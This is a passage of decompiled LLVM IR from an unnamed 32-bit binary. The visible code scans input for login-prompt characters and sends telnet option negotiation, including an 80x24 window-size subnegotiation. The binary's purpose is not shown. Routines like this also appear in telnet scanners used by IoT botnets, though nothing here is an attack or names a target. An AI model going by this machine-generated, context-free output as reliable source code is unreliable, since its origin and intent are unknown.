  %v0_804edbe = phi i32 [ %v1_804ed83, %dec_label_pc_804ed8c ], [ %v1_804ed83, %dec_label_pc_804ed8c ], [ %v0_804eda9, %dec_label_pc_804ed9a ], [ %v1_804eda9, %dec_label_pc_804edb0 ]
  %v1_804edbe = add i32 %v0_804edbe, 1
  store i32 %v1_804edbe, i32* %eax.global-to-local, align 4
  %v1_804edbf = load i32, i32* @esp, align 4
  %v2_804edbf = add i32 %v1_804edbf, 32
  %v3_804edbf = inttoptr i32 %v2_804edbf to i32*
  store i32 %v1_804edbe, i32* %v3_804edbf, align 4
  %v0_804edc3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804edc3 = add i32 %v0_804edc3, 1
  %v8_804edc3 = icmp eq i32 %v1_804edc3, 0
  store i32 %v1_804edc3, i32* %eax.global-to-local, align 4
  br i1 %v8_804edc3, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804edca

dec_label_pc_804edca:                             ; preds = %dec_label_pc_804edbe
  %v0_804edca = load i32, i32* @esp, align 4
  %v1_804edca = add i32 %v0_804edca, 32
  %v2_804edca = inttoptr i32 %v1_804edca to i32*
  %v3_804edca = load i32, i32* %v2_804edca, align 4
  store i32 %v3_804edca, i32* @esi, align 4
  %tmp117 = icmp slt i32 %v3_804edca, 1
  br i1 %tmp117, label %dec_label_pc_804f038, label %dec_label_pc_804edd6

dec_label_pc_804edd6:                             ; preds = %dec_label_pc_804edca
  %v1_804edd9 = add i32 %v0_804edca, -16
  %v2_804edd9 = inttoptr i32 %v1_804edd9 to i32*
  store i32 4, i32* %v2_804edd9, align 4
  %v0_804eddb = call i32 @function_804f740()
  store i32 %v0_804eddb, i32* %eax.global-to-local, align 4
  %v0_804ede0 = load i32, i32* @esp, align 4
  %v1_804ede0 = inttoptr i32 %v0_804ede0 to i32*
  %v2_804ede0 = load i32, i32* %v1_804ede0, align 4
  store i32 %v2_804ede0, i32* %ecx.global-to-local, align 4
  %v3_804ede0 = add i32 %v0_804ede0, 4
  %v1_804ede1 = inttoptr i32 %v3_804ede0 to i32*
  %v2_804ede1 = load i32, i32* %v1_804ede1, align 4
  store i32 %v2_804ede1, i32* @ebx, align 4
  %v1_804ede2 = add i32 %v0_804ede0, 1888
  store i32 %v1_804ede2, i32* %eax.global-to-local, align 4
  store i32 %v1_804ede2, i32* %v1_804ede1, align 4
  store i32 4, i32* %v1_804ede0, align 4
  %v0_804edec = call i32 @function_804f690()
  store i32 %v0_804edec, i32* %eax.global-to-local, align 4
  %v0_804edf1 = load i32, i32* @esp, align 4
  %v1_804edf1 = add i32 %v0_804edf1, -4
  %v2_804edf1 = inttoptr i32 %v1_804edf1 to i32*
  store i32 16384, i32* %v2_804edf1, align 4
  %v1_804edf6 = add i32 %v0_804edf1, 1888
  %v2_804edf6 = inttoptr i32 %v1_804edf6 to i32*
  %v3_804edf6 = load i32, i32* %v2_804edf6, align 4
  store i32 %v3_804edf6, i32* %edx.global-to-local, align 4
  %v2_804edfd = add i32 %v0_804edf1, -8
  %v3_804edfd = inttoptr i32 %v2_804edfd to i32*
  store i32 %v3_804edf6, i32* %v3_804edfd, align 4
  %v2_804edfe = add i32 %v0_804edf1, -12
  %v3_804edfe = inttoptr i32 %v2_804edfe to i32*
  store i32 %v0_804edec, i32* %v3_804edfe, align 4
  %v0_804edff = load i32, i32* @edi, align 4
  %v1_804edff = add i32 %v0_804edff, 4
  %v2_804edff = inttoptr i32 %v1_804edff to i32*
  %v3_804edff = load i32, i32* %v2_804edff, align 4
  store i32 %v3_804edff, i32* %eax.global-to-local, align 4
  %v2_804ee02 = add i32 %v0_804edf1, -16
  %v3_804ee02 = inttoptr i32 %v2_804ee02 to i32*
  store i32 %v3_804edff, i32* %v3_804ee02, align 4
  %v0_804ee03 = call i32 @function_8050966()
  store i32 %v0_804ee03, i32* %eax.global-to-local, align 4
  %v0_804ee08 = load i32, i32* @esp, align 4
  %v1_804ee0b = add i32 %v0_804ee08, 28
  %v2_804ee0b = inttoptr i32 %v1_804ee0b to i32*
  store i32 16384, i32* %v2_804ee0b, align 4
  %v1_804ee10 = add i32 %v0_804ee08, 24
  %v2_804ee10 = inttoptr i32 %v1_804ee10 to i32*
  store i32 2, i32* %v2_804ee10, align 4
  %v1_804ee12 = add i32 %v0_804ee08, 20
  %v2_804ee12 = inttoptr i32 %v1_804ee12 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052b8a.25 to i32), i32* %v2_804ee12, align 4
  %v0_804ee17 = load i32, i32* @edi, align 4
  %v1_804ee17 = add i32 %v0_804ee17, 4
  %v2_804ee17 = inttoptr i32 %v1_804ee17 to i32*
  %v3_804ee17 = load i32, i32* %v2_804ee17, align 4
  %v2_804ee1a = add i32 %v0_804ee08, 16
  %v3_804ee1a = inttoptr i32 %v2_804ee1a to i32*
  store i32 %v3_804ee17, i32* %v3_804ee1a, align 4
  %v0_804ee1b = call i32 @function_8050966()
  store i32 %v0_804ee1b, i32* %eax.global-to-local, align 4
  %v0_804ee20 = load i32, i32* @esp, align 4
  %v1_804ee20 = inttoptr i32 %v0_804ee20 to i32*
  store i32 4, i32* %v1_804ee20, align 4
  %v0_804ee27 = call i32 @function_804f6c0()
  store i32 %v0_804ee27, i32* %eax.global-to-local, align 4
  %v0_804ee2f = load i32, i32* @edi, align 4
  %v1_804ee2f = add i32 %v0_804ee2f, 12
  %v2_804ee2f = inttoptr i32 %v1_804ee2f to i32*
  store i32 8, i32* %v2_804ee2f, align 4
  br label %dec_label_pc_804ed51

dec_label_pc_804ee3b:                             ; preds = %dec_label_pc_804ea42
  %v1_804ee3b = add i32 %v0_804ea42, 24
  %v2_804ee3b = inttoptr i32 %v1_804ee3b to i32*
  %v3_804ee3b = load i32, i32* %v2_804ee3b, align 4
  %v1_804ee3e = add i32 %v3_804ee3b, -1
  store i32 %v1_804ee3e, i32* %eax.global-to-local, align 4
  %tmp118 = icmp slt i32 %v1_804ee3e, 1
  br i1 %tmp118, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804ee47

dec_label_pc_804ee47:                             ; preds = %dec_label_pc_804ee3b
  %v2_804ee47 = add i32 %v0_804ea42, 27
  %v3_804ee47 = add i32 %v2_804ee47, %v3_804ee3b
  %v4_804ee47 = inttoptr i32 %v3_804ee47 to i8*
  %v5_804ee47 = load i8, i8* %v4_804ee47, align 1
  %v6_804ee47 = zext i8 %v5_804ee47 to i32
  %v7_804ee47 = load i32, i32* @edx, align 4
  %v8_804ee47 = and i32 %v7_804ee47, -256
  %v9_804ee47 = or i32 %v8_804ee47, %v6_804ee47
  store i32 %v9_804ee47, i32* %edx.global-to-local, align 4
  switch i8 %v5_804ee47, label %dec_label_pc_804ee55 [
    i8 62, label %dec_label_pc_804ee79
    i8 58, label %dec_label_pc_804ee79
  ]

dec_label_pc_804ee55:                             ; preds = %dec_label_pc_804ee47, %dec_label_pc_804ee6b
  %v0_804ee64 = phi i32 [ %v1_804ee64, %dec_label_pc_804ee6b ], [ %v1_804ee3e, %dec_label_pc_804ee47 ]
  %v7_804ee6b = phi i32 [ %v9_804ee6b, %dec_label_pc_804ee6b ], [ %v9_804ee47, %dec_label_pc_804ee47 ]
  %v1_804ee55 = trunc i32 %v7_804ee6b to i8
  %v1_804ee55.off = add i8 %v1_804ee55, -35
  %switch148 = icmp ult i8 %v1_804ee55.off, 3
  br i1 %switch148, label %dec_label_pc_804ee79, label %dec_label_pc_804ee64

dec_label_pc_804ee64:                             ; preds = %dec_label_pc_804ee55
  %v1_804ee64 = add i32 %v0_804ee64, -1
  %v8_804ee64 = icmp eq i32 %v1_804ee64, 0
  store i32 %v1_804ee64, i32* %eax.global-to-local, align 4
  br i1 %v8_804ee64, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804ee6b

dec_label_pc_804ee6b:                             ; preds = %dec_label_pc_804ee64
  %v3_804ee6b = add i32 %v2_804ee47, %v0_804ee64
  %v4_804ee6b = inttoptr i32 %v3_804ee6b to i8*
  %v5_804ee6b = load i8, i8* %v4_804ee6b, align 1
  %v6_804ee6b = zext i8 %v5_804ee6b to i32
  %v8_804ee6b = and i32 %v7_804ee6b, -256
  %v9_804ee6b = or i32 %v6_804ee6b, %v8_804ee6b
  store i32 %v9_804ee6b, i32* %edx.global-to-local, align 4
  %v10_804ee6f = icmp ne i8 %v5_804ee6b, 58
  %v10_804ee74 = icmp eq i8 %v5_804ee6b, 62
  %v1_804ee77 = icmp eq i1 %v10_804ee74, false
  %or.cond145 = and i1 %v10_804ee6f, %v1_804ee77
  br i1 %or.cond145, label %dec_label_pc_804ee55, label %dec_label_pc_804ee79

dec_label_pc_804ee79:                             ; preds = %dec_label_pc_804ee55, %dec_label_pc_804ee6b, %dec_label_pc_804ee47, %dec_label_pc_804ee47
  %v0_804ee79 = phi i32 [ %v1_804ee3e, %dec_label_pc_804ee47 ], [ %v1_804ee3e, %dec_label_pc_804ee47 ], [ %v0_804ee64, %dec_label_pc_804ee55 ], [ %v1_804ee64, %dec_label_pc_804ee6b ]
  %v1_804ee79 = add i32 %v0_804ee79, 1
  store i32 %v1_804ee79, i32* %eax.global-to-local, align 4
  %v1_804ee7a = load i32, i32* @esp, align 4
  %v2_804ee7a = add i32 %v1_804ee7a, 32
  %v3_804ee7a = inttoptr i32 %v2_804ee7a to i32*
  store i32 %v1_804ee79, i32* %v3_804ee7a, align 4
  %v0_804ee7e = load i32, i32* %eax.global-to-local, align 4
  %v1_804ee7e = add i32 %v0_804ee7e, 1
  %v8_804ee7e = icmp eq i32 %v1_804ee7e, 0
  store i32 %v1_804ee7e, i32* %eax.global-to-local, align 4
  br i1 %v8_804ee7e, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804ee85

dec_label_pc_804ee85:                             ; preds = %dec_label_pc_804ee79
  %v0_804ee85 = load i32, i32* @esp, align 4
  %v1_804ee85 = add i32 %v0_804ee85, 32
  %v2_804ee85 = inttoptr i32 %v1_804ee85 to i32*
  %v3_804ee85 = load i32, i32* %v2_804ee85, align 4
  store i32 %v3_804ee85, i32* %eax.global-to-local, align 4
  %tmp119 = icmp slt i32 %v3_804ee85, 1
  br i1 %tmp119, label %dec_label_pc_804f038, label %dec_label_pc_804ee91

dec_label_pc_804ee91:                             ; preds = %dec_label_pc_804ee85
  %v1_804ee94 = add i32 %v0_804ee85, -16
  %v2_804ee94 = inttoptr i32 %v1_804ee94 to i32*
  store i32 8, i32* %v2_804ee94, align 4
  %v0_804ee96 = call i32 @function_804f740()
  store i32 %v0_804ee96, i32* %eax.global-to-local, align 4
  %v0_804ee9b = load i32, i32* @esp, align 4
  %v1_804ee9b = inttoptr i32 %v0_804ee9b to i32*
  %v3_804ee9b = add i32 %v0_804ee9b, 4
  %v1_804ee9c = inttoptr i32 %v3_804ee9b to i32*
  %v2_804ee9c = load i32, i32* %v1_804ee9c, align 4
  store i32 %v2_804ee9c, i32* %eax.global-to-local, align 4
  %v1_804ee9d = add i32 %v0_804ee9b, 1880
  store i32 %v1_804ee9d, i32* %edx.global-to-local, align 4
  store i32 %v1_804ee9d, i32* %v1_804ee9c, align 4
  store i32 8, i32* %v1_804ee9b, align 4
  %v0_804eea7 = call i32 @function_804f690()
  store i32 %v0_804eea7, i32* %eax.global-to-local, align 4
  %v0_804eeac = load i32, i32* @esp, align 4
  %v1_804eeac = add i32 %v0_804eeac, -4
  %v2_804eeac = inttoptr i32 %v1_804eeac to i32*
  store i32 16384, i32* %v2_804eeac, align 4
  %v1_804eeb1 = add i32 %v0_804eeac, 1880
  %v2_804eeb1 = inttoptr i32 %v1_804eeb1 to i32*
  %v3_804eeb1 = load i32, i32* %v2_804eeb1, align 4
  store i32 %v3_804eeb1, i32* @esi, align 4
  %v2_804eeb8 = add i32 %v0_804eeac, -8
  %v3_804eeb8 = inttoptr i32 %v2_804eeb8 to i32*
  store i32 %v3_804eeb1, i32* %v3_804eeb8, align 4
  %v2_804eeb9 = add i32 %v0_804eeac, -12
  %v3_804eeb9 = inttoptr i32 %v2_804eeb9 to i32*
  store i32 %v0_804eea7, i32* %v3_804eeb9, align 4
  %v0_804eeba = load i32, i32* @edi, align 4
  %v1_804eeba = add i32 %v0_804eeba, 4
  %v2_804eeba = inttoptr i32 %v1_804eeba to i32*
  %v3_804eeba = load i32, i32* %v2_804eeba, align 4
  store i32 %v3_804eeba, i32* @ebx, align 4
  %v2_804eebd = add i32 %v0_804eeac, -16
  %v3_804eebd = inttoptr i32 %v2_804eebd to i32*
  store i32 %v3_804eeba, i32* %v3_804eebd, align 4
  %v0_804eebe = call i32 @function_8050966()
  store i32 %v0_804eebe, i32* %eax.global-to-local, align 4
  %v0_804eec3 = load i32, i32* @esp, align 4
  %v1_804eec6 = add i32 %v0_804eec3, 28
  %v2_804eec6 = inttoptr i32 %v1_804eec6 to i32*
  store i32 16384, i32* %v2_804eec6, align 4
  %v1_804eecb = add i32 %v0_804eec3, 24
  %v2_804eecb = inttoptr i32 %v1_804eecb to i32*
  store i32 2, i32* %v2_804eecb, align 4
  %v1_804eecd = add i32 %v0_804eec3, 20
  %v2_804eecd = inttoptr i32 %v1_804eecd to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052b8a.25 to i32), i32* %v2_804eecd, align 4
  %v0_804eed2 = load i32, i32* @edi, align 4
  %v1_804eed2 = add i32 %v0_804eed2, 4
  %v2_804eed2 = inttoptr i32 %v1_804eed2 to i32*
  %v3_804eed2 = load i32, i32* %v2_804eed2, align 4
  store i32 %v3_804eed2, i32* %ecx.global-to-local, align 4
  %v2_804eed5 = add i32 %v0_804eec3, 16
  %v3_804eed5 = inttoptr i32 %v2_804eed5 to i32*
  store i32 %v3_804eed2, i32* %v3_804eed5, align 4
  %v0_804eed6 = call i32 @function_8050966()
  store i32 %v0_804eed6, i32* %eax.global-to-local, align 4
  %v0_804eedb = load i32, i32* @esp, align 4
  %v1_804eedb = inttoptr i32 %v0_804eedb to i32*
  store i32 8, i32* %v1_804eedb, align 4
  %v0_804eee2 = call i32 @function_804f6c0()
  store i32 %v0_804eee2, i32* %eax.global-to-local, align 4
  %v0_804eeea = load i32, i32* @edi, align 4
  %v1_804eeea = add i32 %v0_804eeea, 12
  %v2_804eeea = inttoptr i32 %v1_804eeea to i32*
  store i32 10, i32* %v2_804eeea, align 4
  br label %dec_label_pc_804ed51

dec_label_pc_804eef6:                             ; preds = %dec_label_pc_804ea79
  %v1_804eef6 = add i32 %v1_804ef00, 32
  %v2_804eef6 = inttoptr i32 %v1_804eef6 to i32*
  %v3_804eef6 = load i32, i32* %v2_804eef6, align 4
  %v1_804eefa = add i32 %v0_804ea67, 2
  store i32 %v1_804eefa, i32* @ebx, align 4
  %v1_804eefd = add i32 %v3_804eef6, 2
  store i32 %v1_804eefd, i32* %esi.global-to-local, align 4
  store i32 %v1_804eefd, i32* %v2_804eef6, align 4
  %v4_804ea61.pre.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_804ea61.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ea61.backedge

dec_label_pc_804ef09:                             ; preds = %dec_label_pc_804eaa5
  store i8 -4, i8* %v2_804eaa5, align 1
  br label %dec_label_pc_804eab8

dec_label_pc_804ef12:                             ; preds = %dec_label_pc_804ea93
  store i8 -4, i8* %v1_804ea93, align 1
  br label %dec_label_pc_804eaa5

dec_label_pc_804ef1a:                             ; preds = %dec_label_pc_804ea79
  %v1_804ef1a = add i32 %v1_804ef00, 1879
  %v2_804ef1a = inttoptr i32 %v1_804ef1a to i8*
  store i8 -1, i8* %v2_804ef1a, align 1
  %v0_804ef22 = load i32, i32* @esp, align 4
  %v1_804ef22 = add i32 %v0_804ef22, 1880
  %v2_804ef22 = inttoptr i32 %v1_804ef22 to i8*
  store i8 -5, i8* %v2_804ef22, align 1
  %v0_804ef2a = load i32, i32* @esp, align 4
  %v1_804ef2a = add i32 %v0_804ef2a, 1881
  %v2_804ef2a = inttoptr i32 %v1_804ef2a to i8*
  store i8 31, i8* %v2_804ef2a, align 1
  %v0_804ef32 = load i32, i32* @esp, align 4
  %v1_804ef32 = add i32 %v0_804ef32, 1847
  %v2_804ef32 = inttoptr i32 %v1_804ef32 to i8*
  store i8 -1, i8* %v2_804ef32, align 1
  %v0_804ef3a = load i32, i32* @esp, align 4
  %v1_804ef3a = add i32 %v0_804ef3a, 1848
  %v2_804ef3a = inttoptr i32 %v1_804ef3a to i8*
  store i8 -6, i8* %v2_804ef3a, align 1
  %v0_804ef42 = load i32, i32* @esp, align 4
  %v1_804ef42 = add i32 %v0_804ef42, 1849
  %v2_804ef42 = inttoptr i32 %v1_804ef42 to i8*
  store i8 31, i8* %v2_804ef42, align 1
  %v0_804ef4a = load i32, i32* @esp, align 4
  %v1_804ef4a = add i32 %v0_804ef4a, 1850
  %v2_804ef4a = inttoptr i32 %v1_804ef4a to i8*
  store i8 0, i8* %v2_804ef4a, align 1
  %v0_804ef52 = load i32, i32* @esp, align 4
  %v1_804ef52 = add i32 %v0_804ef52, 1851
  %v2_804ef52 = inttoptr i32 %v1_804ef52 to i8*
  store i8 80, i8* %v2_804ef52, align 1
  %v0_804ef5a = load i32, i32* @esp, align 4
  %v1_804ef5a = add i32 %v0_804ef5a, 1852
  %v2_804ef5a = inttoptr i32 %v1_804ef5a to i8*
  store i8 0, i8* %v2_804ef5a, align 1
  %v0_804ef62 = load i32, i32* @esp, align 4
  %v1_804ef62 = add i32 %v0_804ef62, 1853
  %v2_804ef62 = inttoptr i32 %v1_804ef62 to i8*
  store i8 24, i8* %v2_804ef62, align 1
  %v0_804ef6a = load i32, i32* @esp, align 4
  %v1_804ef6a = add i32 %v0_804ef6a, 1854
  %v2_804ef6a = inttoptr i32 %v1_804ef6a to i8*
  store i8 -1, i8* %v2_804ef6a, align 1
  %v0_804ef72 = load i32, i32* @esp, align 4
  %v1_804ef72 = add i32 %v0_804ef72, 1855
  %v2_804ef72 = inttoptr i32 %v1_804ef72 to i8*
  store i8 -16, i8* %v2_804ef72, align 1
  %v0_804ef7a = load i32, i32* @esp, align 4
  %v1_804ef7a = add i32 %v0_804ef7a, 16
  %v2_804ef7a = inttoptr i32 %v1_804ef7a to i32*
  %v3_804ef7a = load i32, i32* %v2_804ef7a, align 4
  store i32 %v3_804ef7a, i32* %eax.global-to-local, align 4
  %v0_804ef7e = load i32, i32* @edi, align 4
  %v1_804ef7e = add i32 %v0_804ef7e, 24
  %v2_804ef7e = inttoptr i32 %v1_804ef7e to i32*
  %v3_804ef7e = load i32, i32* %v2_804ef7e, align 4
  store i32 %v3_804ef7e, i32* %ecx.global-to-local, align 4
  %v0_804ef81 = load i32, i32* @ebx, align 4
  %v1_804ef81 = add i32 %v0_804ef81, 2
  store i32 %v1_804ef81, i32* %edx.global-to-local, align 4
  %v2_804ef84 = add i32 %v3_804ef7e, %v3_804ef7a
  store i32 %v2_804ef84, i32* %eax.global-to-local, align 4
  %tmp270 = icmp ugt i32 %v2_804ef84, %v1_804ef81
  br i1 %tmp270, label %dec_label_pc_804ef8e, label %dec_label_pc_804eae3

dec_label_pc_804ef8e:                             ; preds = %dec_label_pc_804ef1a
  %v2_804ef8e = inttoptr i32 %v1_804ef81 to i8*
  %v3_804ef8e = load i8, i8* %v2_804ef8e, align 1
  %v12_804ef8e = icmp eq i8 %v3_804ef8e, 31
  br i1 %v12_804ef8e, label %dec_label_pc_804f402, label %dec_label_pc_804ef98

dec_label_pc_804ef98:                             ; preds = %dec_label_pc_804ef8e
  %v1_804ef98 = inttoptr i32 %v0_804ef81 to i8*
  %v2_804ef98 = load i8, i8* %v1_804ef98, align 1
  %v3_804ef98 = zext i8 %v2_804ef98 to i32
  %v5_804ef98 = and i32 %v2_804ef84, -256
  %v6_804ef98 = or i32 %v3_804ef98, %v5_804ef98
  store i32 %v6_804ef98, i32* %eax.global-to-local, align 4
  %v11_804ef9a = icmp eq i8 %v2_804ef98, -3
  %v1_804ef9c = icmp eq i1 %v11_804ef9a, false
  br i1 %v1_804ef9c, label %dec_label_pc_804f4d3, label %dec_label_pc_804efa2

dec_label_pc_804efa2:                             ; preds = %dec_label_pc_804ef98
  store i8 -4, i8* %v1_804ef98, align 1
  br label %dec_label_pc_804ea93

dec_label_pc_804efaa:                             ; preds = %dec_label_pc_804e9eb
  %v1_804ea18 = icmp eq i32 %v0_804ea10, 0
  br i1 %v1_804ea18, label %dec_label_pc_804f47c, label %dec_label_pc_804efb0

dec_label_pc_804efb0:                             ; preds = %dec_label_pc_804efaa
  %v10_804efb0 = icmp eq i32 %v0_804ea10, -1
  %v1_804efb3 = icmp eq i1 %v10_804efb0, false
  br i1 %v1_804efb3, label %dec_label_pc_804ea32, label %dec_label_pc_804efb9

dec_label_pc_804efb9:                             ; preds = %dec_label_pc_804efb0
  %v1_804efb9 = add i32 %v0_804ea15, 56
  %v2_804efb9 = inttoptr i32 %v1_804efb9 to i32*
  %v3_804efb9 = load i32, i32* %v2_804efb9, align 4
  store i32 %v3_804efb9, i32* %edx.global-to-local, align 4
  %v1_804efbd = inttoptr i32 %v3_804efb9 to i32*
  %v2_804efbd = load i32, i32* %v1_804efbd, align 4
  %v11_804efbd = icmp eq i32 %v2_804efbd, 11
  br i1 %v11_804efbd, label %dec_label_pc_804e8dd, label %dec_label_pc_804efc6

dec_label_pc_804efc6:                             ; preds = %dec_label_pc_804efb9, %dec_label_pc_804f47c
  %v0_804efc6 = phi i32 [ %v1_804ea15, %dec_label_pc_804efb9 ], [ %v0_804efc6.pre, %dec_label_pc_804f47c ]
  %v0_804efc9 = load i32, i32* @edi, align 4
  %v1_804efc9 = add i32 %v0_804efc9, 4
  %v2_804efc9 = inttoptr i32 %v1_804efc9 to i32*
  %v3_804efc9 = load i32, i32* %v2_804efc9, align 4
  store i32 %v3_804efc9, i32* %eax.global-to-local, align 4
  %v2_804efcc = add i32 %v0_804efc6, -16
  %v3_804efcc = inttoptr i32 %v2_804efcc to i32*
  store i32 %v3_804efc9, i32* %v3_804efcc, align 4
  %v1_804efcd = call i32 @function_8050233(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804efcd, i32* %eax.global-to-local, align 4
  %v0_804efd2 = load i32, i32* @edi, align 4
  %v1_804efd2 = add i32 %v0_804efd2, 284
  %v2_804efd2 = inttoptr i32 %v1_804efd2 to i8*
  %v3_804efd2 = load i8, i8* %v2_804efd2, align 1
  %v4_804efd2 = zext i8 %v3_804efd2 to i32
  %v6_804efd2 = and i32 %v1_804efcd, -256
  %v7_804efd2 = or i32 %v4_804efd2, %v6_804efd2
  %v1_804efdb = add i32 %v7_804efd2, 1
  store i32 %v1_804efdb, i32* %eax.global-to-local, align 4
  %v1_804efdc = add i32 %v0_804efd2, 4
  %v2_804efdc = inttoptr i32 %v1_804efdc to i32*
  store i32 -1, i32* %v2_804efdc, align 4
  %v0_804efe3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804efe3 = trunc i32 %v0_804efe3 to i8
  %v2_804efe3 = load i32, i32* @edi, align 4
  %v3_804efe3 = add i32 %v2_804efe3, 284
  %v4_804efe3 = inttoptr i32 %v3_804efe3 to i8*
  store i8 %v1_804efe3, i8* %v4_804efe3, align 1
  %v0_804efe9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804efe9 = trunc i32 %v0_804efe9 to i8
  %tmp271 = icmp ult i8 %v1_804efe9, 10
  %v0_804f48b = load i32, i32* @edi, align 4
  br i1 %tmp271, label %dec_label_pc_804f48b, label %dec_label_pc_804eff1

dec_label_pc_804eff1:                             ; preds = %dec_label_pc_804efc6
  %v1_804eff1 = add i32 %v0_804f48b, 284
  %v2_804eff1 = inttoptr i32 %v1_804eff1 to i8*
  store i8 0, i8* %v2_804eff1, align 1
  %v0_804eff8 = load i32, i32* @edi, align 4
  %v1_804eff8 = add i32 %v0_804eff8, 12
  %v2_804eff8 = inttoptr i32 %v1_804eff8 to i32*
  store i32 0, i32* %v2_804eff8, align 4
  br label %dec_label_pc_804e8dd

dec_label_pc_804f004:                             ; preds = %dec_label_pc_804ea93
  store i8 -3, i8* %v1_804ea93, align 1
  br label %dec_label_pc_804eaa5

dec_label_pc_804f00c:                             ; preds = %dec_label_pc_804eaa5
  store i8 -3, i8* %v2_804eaa5, align 1
  br label %dec_label_pc_804eab8

dec_label_pc_804f015:                             ; preds = %dec_label_pc_804e9d7
  %v0_804f015 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804f015, i32* %edx.global-to-local, align 4
  %v1_804f017 = load i32, i32* @esp, align 4
  %v2_804f017 = add i32 %v1_804f017, -4
  %v3_804f017 = inttoptr i32 %v2_804f017 to i32*
  store i32 %v0_804f015, i32* %v3_804f017, align 4
  %v0_804f018 = load i32, i32* @edi, align 4
  %v1_804f018 = add i32 %v0_804f018, 92
  store i32 %v1_804f018, i32* %eax.global-to-local, align 4
  %v1_804f01b = add i32 %v1_804f017, -8
  %v2_804f01b = inttoptr i32 %v1_804f01b to i32*
  store i32 192, i32* %v2_804f01b, align 4
  %v0_804f020 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f020 = add i32 %v1_804f017, -12
  %v3_804f020 = inttoptr i32 %v2_804f020 to i32*
  store i32 %v0_804f020, i32* %v3_804f020, align 4
  %v0_804f021 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f021 = add i32 %v1_804f017, -16
  %v3_804f021 = inttoptr i32 %v2_804f021 to i32*
  store i32 %v0_804f021, i32* %v3_804f021, align 4
  %v4_804f022 = call i32 @function_8050795(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804f022, i32* %eax.global-to-local, align 4
  %v0_804f027 = load i32, i32* @edi, align 4
  %v1_804f027 = add i32 %v0_804f027, 24
  %v2_804f027 = inttoptr i32 %v1_804f027 to i32*
  %v3_804f027 = load i32, i32* %v2_804f027, align 4
  %v1_804f02a = add i32 %v3_804f027, -64
  store i32 %v1_804f02a, i32* %eax.global-to-local, align 4
  store i32 %v1_804f02a, i32* %v2_804f027, align 4
  br label %dec_label_pc_804e9eb

dec_label_pc_804f038:                             ; preds = %dec_label_pc_804ee85, %dec_label_pc_804edca, %dec_label_pc_804f3ac, %dec_label_pc_804ec5a, %dec_label_pc_804f18e, %dec_label_pc_804f05c, %dec_label_pc_804f138, %dec_label_pc_804f2c7, %dec_label_pc_804eae3
  %v0_804f038 = phi i32 [ %v0_804ee85, %dec_label_pc_804ee85 ], [ %v0_804edca, %dec_label_pc_804edca ], [ %v1_804f39e, %dec_label_pc_804f3ac ], [ %v0_804ec5a, %dec_label_pc_804ec5a ], [ %v0_804f18e, %dec_label_pc_804f18e ], [ %v0_804f05c, %dec_label_pc_804f05c ], [ %v0_804f148, %dec_label_pc_804f138 ], [ %v0_804f2d7, %dec_label_pc_804f2c7 ], [ %v0_804eae3, %dec_label_pc_804eae3 ]
  %v1_804f038 = add i32 %v0_804f038, 32
  %v2_804f038 = inttoptr i32 %v1_804f038 to i32*
  %v3_804f038 = load i32, i32* %v2_804f038, align 4
  %v1_804f03c = icmp eq i32 %v3_804f038, 0
  %v1_804f03e = icmp eq i1 %v1_804f03c, false
  br i1 %v1_804f03e, label %dec_label_pc_804ed51, label %dec_label_pc_804e9cc.backedge

dec_label_pc_804f050:                             ; preds = %dec_label_pc_804eb8c, %dec_label_pc_804eb8c, %dec_label_pc_804eb8c, %dec_label_pc_804eb8c, %dec_label_pc_804eb8c
  %v1_804f050 = add i32 %v0_804f050, 1
  store i32 %v1_804f050, i32* %eax.global-to-local, align 4
  %v1_804f051 = load i32, i32* @esp, align 4
  %v2_804f051 = add i32 %v1_804f051, 32
  %v3_804f051 = inttoptr i32 %v2_804f051 to i32*
  store i32 %v1_804f050, i32* %v3_804f051, align 4
  %v0_804f055 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f055 = add i32 %v0_804f055, 1
  %v8_804f055 = icmp eq i32 %v1_804f055, 0
  store i32 %v1_804f055, i32* %eax.global-to-local, align 4
  br i1 %v8_804f055, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804f05c

dec_label_pc_804f05c:                             ; preds = %dec_label_pc_804f050
  %v0_804f05c = load i32, i32* @esp, align 4
  %v1_804f05c = add i32 %v0_804f05c, 32
  %v2_804f05c = inttoptr i32 %v1_804f05c to i32*
  %v3_804f05c = load i32, i32* %v2_804f05c, align 4
  store i32 %v3_804f05c, i32* @esi, align 4
  %tmp120 = icmp slt i32 %v3_804f05c, 1
  br i1 %tmp120, label %dec_label_pc_804f038, label %dec_label_pc_804f064

dec_label_pc_804f064:                             ; preds = %dec_label_pc_804f05c
  %v1_804f067 = add i32 %v0_804f05c, -16
  %v2_804f067 = inttoptr i32 %v1_804f067 to i32*
  store i32 5, i32* %v2_804f067, align 4
  %v0_804f069 = call i32 @function_804f740()
  store i32 %v0_804f069, i32* %eax.global-to-local, align 4
  %v0_804f06e = load i32, i32* @esp, align 4
  %v1_804f06e = inttoptr i32 %v0_804f06e to i32*
  %v2_804f06e = load i32, i32* %v1_804f06e, align 4
  store i32 %v2_804f06e, i32* %ecx.global-to-local, align 4
  %v3_804f06e = add i32 %v0_804f06e, 4
  %v1_804f06f = inttoptr i32 %v3_804f06e to i32*
  %v2_804f06f = load i32, i32* %v1_804f06f, align 4
  store i32 %v2_804f06f, i32* @ebx, align 4
  %v1_804f070 = add i32 %v0_804f06e, 1880
  store i32 %v1_804f070, i32* %ecx.global-to-local, align 4
  store i32 %v1_804f070, i32* %v1_804f06f, align 4
  store i32 5, i32* %v1_804f06e, align 4
  %v0_804f07a = call i32 @function_804f690()
  store i32 %v0_804f07a, i32* %eax.global-to-local, align 4
  %v0_804f07f = load i32, i32* @esp, align 4
